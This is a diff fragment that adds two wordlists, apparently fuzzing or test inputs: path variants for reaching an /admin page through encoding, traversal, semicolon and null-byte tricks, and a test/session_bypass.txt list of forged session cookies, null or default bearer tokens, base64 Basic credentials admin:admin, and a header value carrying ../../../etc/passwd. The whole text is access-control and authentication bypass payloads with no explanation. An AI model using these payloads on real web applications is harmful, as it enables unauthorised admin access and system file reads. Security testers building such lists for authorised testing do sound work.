@@ -1,0 +1,40 @@
+/
+/index.html
+/..;/admin
+/./admin
+//admin
+/admin/
+/ADMIN
+/%61dmin
+/admin%20
+/admin%09
+/admin%00
+/admin;.js
+/admin..;/
+/;/admin
+/?anything=/admin
+/admin#
+/admin?debug=true
+/admin?test
+/.;/admin
+/api/../admin
+
+# ── test/session_bypass.txt ───────────────────────────────────────────────────
+session=admin
+session=1; role=admin
+auth=true; admin=1
+token=null
+token=undefined
+token=0
+Authorization: Bearer null
+Authorization: Bearer undefined
+Authorization: Bearer 0
+Authorization: Basic YWRtaW46YWRtaW4=
+Authorization: Basic YWRtaW46
+X-Auth-Token: 0
+X-Auth-Token: null
+X-Access-Token: ../../../etc/passwd
+role=admin
+isAdmin=true
+user=admin; pass=
+debug=1; bypass=true
